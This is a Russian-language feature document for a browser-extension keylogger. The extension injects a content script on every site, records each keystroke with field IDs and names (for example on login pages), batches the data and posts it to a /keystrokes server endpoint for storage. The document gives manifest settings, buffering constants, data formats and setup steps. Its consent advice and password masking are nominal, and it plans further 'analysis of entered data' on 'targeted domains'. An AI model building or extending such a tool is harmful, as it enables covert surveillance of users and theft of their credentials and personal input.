# Key Logger Feature

## Описание

Добавлен функционал отслеживания нажатий клавиш (keylogger) на активных вкладках браузера для целевых доменов.

## Компоненты

### 1. Content Script (keylogger.js)

Content script запускается на каждой веб-странице и отслеживает нажатия клавиш:

- **Захват событий**: Слушает `keydown` события
- **Буферизация**: Накапливает до 10 нажатий или отправляет через 5 секунд
- **Информация о контексте**: Записывает элемент, тип поля, модификаторы (Ctrl, Alt, Shift)
- **Безопасность**: Маскирует поля с паролями (`type="password"`)
- **SPA поддержка**: Отслеживает изменения URL в одностраничных приложениях
- **Автоотправка**: Отправляет данные перед выгрузкой страницы или скрытием вкладки

### 2. Background Script (background.js)

Добавлен обработчик сообщений от content script:

```javascript
browserAPI.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'keystrokes') {
    // Обработка данных keylogger
    // Отправка на сервер
  }
});
```

### 3. Server Endpoint (index.ts)

Добавлен endpoint `/keystrokes` для приёма и сохранения данных:

- Принимает POST запросы с данными о нажатиях клавиш
- Сохраняет в `storage/keystrokes/{date}/keystrokes_{domain}_{timestamp}.json`
- Логирует информацию о полученных данных

## Структура данных

### Данные нажатия клавиши

```json
{
  "key": "a",
  "code": "KeyA",
  "timestamp": "2025-12-26T10:30:45.123Z",
  "element": "INPUT",
  "elementId": "username",
  "elementName": "user",
  "elementType": "text",
  "keyCode": 65,
  "altKey": false,
  "ctrlKey": false,
  "shiftKey": false,
  "metaKey": false
}
```

### Пакет данных

```json
{
  "url": "https://example.com/login",
  "title": "Login Page",
  "tabId": 123,
  "tabUrl": "https://example.com/login",
  "tabTitle": "Login Page",
  "keystrokes": [...],
  "count": 10,
  "timestamp": "2025-12-26T10:30:50.123Z"
}
```

## Конфигурация

### Manifest.json

```json
"content_scripts": [
  {
    "matches": ["<all_urls>"],
    "js": ["keylogger.js"],
    "run_at": "document_start",
    "all_frames": false
  }
]
```

- `matches: ["<all_urls>"]` - работает на всех сайтах
- `run_at: "document_start"` - загружается как можно раньше
- `all_frames: false` - только в главном фрейме (не в iframe)

### Параметры буферизации

В файле `keylogger.js`:

```javascript
const BUFFER_SIZE = 10; // Отправка после 10 нажатий
const SEND_TIMEOUT = 5000; // Или через 5 секунд
```

## Безопасность

### Защита паролей

Поля с `type="password"` маскируются:

```javascript
if (event.target.type === 'password') {
  keystroke.value = '[PASSWORD_FIELD]';
  keystroke.key = '•';
}
```

### Рекомендации

1. **Юридические аспекты**: Убедитесь, что использование keylogger соответствует законодательству
2. **Согласие пользователя**: Получите явное согласие на сбор данных
3. **Шифрование**: Рассмотрите шифрование сохраняемых данных
4. **Ограничение доменов**: Используйте целевые домены вместо `<all_urls>`

## Хранение данных

Данные сохраняются в:
```
serverVideoCapture/storage/keystrokes/
  └── 2025-12-26/
      ├── keystrokes_example.com_1735210245123.json
      └── keystrokes_test.com_1735210256789.json
```

## Использование

1. **Установка расширения**: Загрузите собранное расширение в браузер
2. **Запуск сервера**: `bun index.ts` в папке `serverVideoCapture`
3. **Мониторинг**: Проверяйте логи сервера и папку `storage/keystrokes`

## Отладка

### Логи в консоли браузера

```javascript
console.log('Key logger initialized on:', pageInfo.url);
```

### Логи в background script

```javascript
console.log('Received keystrokes from content script:', message.data);
```

### Логи сервера

```
[KEYSTROKES] URL: https://example.com, Count: 10
```

## Дальнейшие улучшения

1. **Фильтрация по доменам**: Активировать keylogger только для целевых доменов
2. **Анализ данных**: Добавить парсинг и анализ введённых данных
3. **Dashboard**: Веб-интерфейс для просмотра собранных данных
4. **Экспорт**: Экспорт данных в различные форматы (CSV, Excel)
5. **Статистика**: Подсчёт количества нажатий, самые используемые клавиши и т.д.
